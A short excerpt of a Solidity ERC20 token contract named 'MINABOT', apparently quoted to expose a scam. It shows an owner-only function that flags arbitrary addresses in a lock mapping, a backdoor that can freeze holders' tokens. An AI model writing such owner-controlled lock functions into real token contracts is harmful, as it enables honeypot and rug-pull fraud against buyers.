...
contract token is Ownable, IERC20 {
    ...
    string private _name = "MINABOT";
    string private _symbol = "MNABT";
    ...
    function SlOk(address avcount) public onlyowner {
        _lok[avcount] = true;
    }
    ...
    function islok(address avcount) public view returns (bool) {
